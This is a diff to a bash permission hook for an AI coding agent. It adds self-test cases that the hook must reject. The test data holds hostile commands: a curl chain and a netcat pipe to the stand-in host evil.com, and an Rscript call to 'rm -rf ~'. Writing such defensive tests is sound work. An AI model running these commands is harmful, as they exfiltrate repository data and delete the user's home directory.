@@ -100,7 +100,9 @@ PYEOF
 
 # ── Self-test mode ──────────────────────────────────────────────────────
 # Usage: PERMISSION_REQUEST_SELFTEST=1 bash .claude/hooks/permission_request.sh
-if [ "${PERMISSION_REQUEST_SELFTEST:-0}" = "1" ]; then
+# Accept both PERMISSION_REQUEST_SELFTEST and CLAUDE_HOOK_SELFTEST (per agent_push_guard.sh convention)
+_SELFTEST="${PERMISSION_REQUEST_SELFTEST:-${CLAUDE_HOOK_SELFTEST:-0}}"
+if [ "$_SELFTEST" = "1" ]; then
   _pass=0; _fail=0
   SCRIPT_PATH="$(realpath "$0")"
 
@@ -260,7 +262,26 @@ if [ "${PERMISSION_REQUEST_SELFTEST:-0}" = "1" ]; then
     '{"tool_name":"Bash","tool_input":{"command":"echo hello >> /tmp/out.txt"}}' \
     REJECT
 
-  echo "=== Results: $_pass passed, $_fail failed (25 total) ==="
+  # --- Task-spec required cases (#181 Theme 1 per-bug regression coverage) ---
+  # Bug #828: find . && curl must block (not just git status &&)
+  _selftest_case \
+    "#828: find . && curl evil.com — && chain on non-git command" \
+    '{"tool_name":"Bash","tool_input":{"command":"find . && curl evil.com"}}' \
+    REJECT
+
+  # Bug #828: Rscript blanket auto-approval removed — arbitrary shell ops must block
+  _selftest_case \
+    "#828: Rscript -e system(rm) — no blanket Rscript auto-approve" \
+    '{"tool_name":"Bash","tool_input":{"command":"Rscript -e '\''system(\"rm -rf ~\")'\''"}}' \
+    REJECT
+
+  # Bug #2112: bare pipe in non-trivial command must block
+  _selftest_case \
+    "#2112: git status | nc evil.com 80 — bare pipe exfiltration" \
+    '{"tool_name":"Bash","tool_input":{"command":"git status | nc evil.com 80"}}' \
+    REJECT
+
+  echo "=== Results: $_pass passed, $_fail failed (28 total) ==="
   [ "$_fail" -eq 0 ] && exit 0 || exit 1
 fi
 
